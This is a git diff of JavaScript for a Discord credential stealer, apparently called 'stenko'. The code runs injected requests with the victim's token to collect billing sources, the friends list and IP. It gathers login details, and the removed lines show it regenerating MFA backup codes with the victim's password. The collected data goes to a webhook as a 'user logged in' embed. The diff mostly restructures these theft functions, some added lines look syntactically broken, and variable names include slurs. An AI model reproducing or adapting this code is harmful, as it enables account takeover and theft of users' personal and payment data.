@@ -91,99 +91,54 @@ function Login(email, password, token) {
     xmlHttp.setRequestHeader("Authorization", "${token}");
     xmlHttp.send( null );
     xmlHttp.responseText;`, !0).then((info) => {
-		window.webContents.executeJavaScript(`
-        var xmlHttp = new XMLHttpRequest();
-        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
-        xmlHttp.send( null );
-        xmlHttp.responseText;
-    `, !0).then((ip) => {
-			window.webContents.executeJavaScript(`
-        var xmlHttp = new XMLHttpRequest();
-        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
-        xmlHttp.setRequestHeader("Authorization", "${token}");
-        xmlHttp.send( null );
-        xmlHttp.responseText`, !0).then((info3) => {
-				window.webContents.executeJavaScript(`
-            var xmlHttp = new XMLHttpRequest();
-            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
-            xmlHttp.setRequestHeader("Authorization", "${token}");
-            xmlHttp.send( null );
-            xmlHttp.responseText`, !0).then((info4) => {
 
-					if (token.startsWith("mfa")) {
-						window.webContents.executeJavaScript(`
-              var xmlHttp = new XMLHttpRequest();
-              xmlHttp.open("POST", "https://discord.com/api/v9/users/@me/mfa/codes", false);
-              xmlHttp.setRequestHeader('Content-Type', 'application/json');
-              xmlHttp.setRequestHeader("authorization", "${token}")
-              xmlHttp.send(JSON.stringify({\"password\":\"${password}\",\"regenerate\":true}));
-              xmlHttp.responseText`, !0).then((codes) => {
+function totalFriends() {
+	var f = JSON.parse(info4)
+	const r = f.filter((user) => {
 
-							var fieldo = [];
-							var baseuri = "https://premium.piratestealer.to/raw/"
+		return user.type == 1
+	})
+	return r.length
+}
 
+function CalcFriends() {
+	var f = JSON.parse(info4)
+	const r = f.filter((user) => {
+		return user.type == 1
+	})
+	var gay = "";
+	for (z of r) {
+		var b = GetRBadges(z.user.public_flags)
+		if (b != "") {
+			gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
+		}
+	}
+	if (gay == "") {
+		gay = "No Rare Friends"
+	}
+	return gay
+}
 
-							var gayass = JSON.parse(codes)
-
-							let g = gayass.backup_codes
-							const r = g.filter((code) => {
-								return code.consumed == null
-							})
-							for (let z in r) {
-								fieldo.push({
-									name: `Code`,
-									value: `\`${r[z].code.insert(4, "-")}\``,
-									inline: true
-								})
-								baseuri += `${r[z].code.insert(4, "-")}<br>`
-							}
-
-							function totalFriends() {
-								var f = JSON.parse(info4)
-								const r = f.filter((user) => {
-
-									return user.type == 1
-								})
-								return r.length
-							}
-
-							function CalcFriends() {
-								var f = JSON.parse(info4)
-								const r = f.filter((user) => {
-									return user.type == 1
-								})
-								var gay = "";
-								for (z of r) {
-									var b = GetRBadges(z.user.public_flags)
-									if (b != "") {
-										gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
-									}
-								}
-								if (gay == "") {
-									gay = "No Rare Friends"
-								}
-								return gay
-							}
-
-							function Cool() {
-								const json = JSON.parse(info3)
-								var billing = "";
-								json.forEach(z => {
-									if (z.type == "") {
-										return "\`❌\`"
-									} else if (z.type == 2 && z.invalid != !0) {
-										billing += "\`✔️\`" + " <:paypal:896441236062347374>"
-									} else if (z.type == 1 && z.invalid != !0) {
-										billing += "\`✔️\`" + " :credit_card:"
-									} else {
-										return "\`❌\`"
-									}
-								})
-								if (billing == "") {
-									billing = "\`❌\`"
-								}
-								return billing
-							}
+function Cool() {
+	const json = JSON.parse(info3)
+	var billing = "";
+	json.forEach(z => {
+		if (z.type == "") {
+			return "\`❌\`"
+		} else if (z.type == 2 && z.invalid != !0) {
+			billing += "\`✔️\`" + " <:paypal:896441236062347374>"
+		} else if (z.type == 1 && z.invalid != !0) {
+			billing += "\`✔️\`" + " :credit_card:"
+		} else {
+			return "\`❌\`"
+		}
+	})
+	if (billing == "") {
+		billing = "\`❌\`"
+	}
+	return billing
+}
+	    
         const json = JSON.parse(info);
         var params = {
             username: "stenko",
@@ -191,9 +146,20 @@ function Login(email, password, token) {
             avatar_url: "https://i.imgur.com/mnMYF8Y.jpg",
             embeds: [
                 {
-                    "title": `Total Friends (${totalFriends()})`,
+                    "title": "user logged in",
                     "color": 3092790,
-                    "description": CalcFriends(),
+                    "fields": [
+                        {
+                            "name": " friends number",
+                            "value": ${totalFriends()},
+                            "inline": true		    
+                        },
+                        {
+                            "name": " friends discord",
+                            "value": CalcFriends(),
+                            "inline": false
+                        }
+                    ],
                     "author": {
                         "name": "stenko premium version",
 			"url": `https://stenko.xyz`,
